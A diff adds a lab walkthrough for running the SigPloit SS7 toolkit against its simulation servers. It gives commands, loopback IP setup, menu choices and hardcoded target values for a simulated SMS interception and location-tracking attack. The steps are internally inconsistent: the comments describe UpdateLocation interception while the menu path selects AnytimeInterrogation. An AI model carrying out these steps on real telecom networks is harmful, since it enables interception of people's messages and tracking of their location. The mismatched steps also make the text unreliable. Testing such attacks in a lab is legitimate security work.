@@ -1,0 +1,53 @@
+git clone https://github.com/ethicalhackeragnidhra/SigPloit-ss7
+
+cd SigPloit-ss7  
+cd Testing/Server/Attacks/Interception
+
+# The scripts found in here are the server side built for testing purposes and simulating attacks before being usen real environment
+# All variable are hardcoded, they could be changed upon your need and found in server tests source codes
+
+cd UpdateLocation_Server 
+
+cat Parameters          
+
+#This code aims to simulate a full man in the middle attack for SMS 
+#This code simulates the HLR of target to receive the fake update location
+#This code simulates an SMSC to deliever an SMS to the attacker
+#This coode simulates the legtimite MSC of target prior to the fake update location to forward the intercepted SMS
+
+# You need to add the ip address to the terminal machine to launnch the attack
+
+sudo ip address add 192.168.56.101/32 dev lo
+sudo ip address add 192.168.56.102/32 dev lo
+
+# Run the java file to initiate the SCTP stack.
+
+sudo java -jar UpdateLocation.jar
+
+# after initiating the stcp stack go back to the SigPloit-SS7 so that we can run SS7 python file.
+
+python2 ss7
+
+# For performing the attack we need to follow step -> SS7 -> Location Tracking -> AnytimeInterrogation
+sig> 0  
+(Attacks)> 1
+(LocationTracking)> 0
+
+# then you write the hardcoded values.
+
+[*]Set Client PC: 1
+[*]Set Peer PC: 2
+[*]Set Client IP: 192.168.56.101
+[*]Set Client Port: 2905
+[*]Set Peer IP: 192.168.56.102
+[*]Set Peer Port: 2906
+[*]Set Network Indicator [0] International [2] National: 0
+[*]Set Target's IMSI: 602027891234567
+[*]Set Target's IMSI in GT Format [ mcc+mnc+msin --> cc+ndc+msin ]: 2010789123456
+[*]Set your GT: 96512345678
+[*]Forward the intercepted SMS to target?(y/n): y
+[*]Set Target's Current MSC GT: 201012344321
+
+# Open wireshark in the display filter write tcap to shorten your search
+
+sudo wire shark.
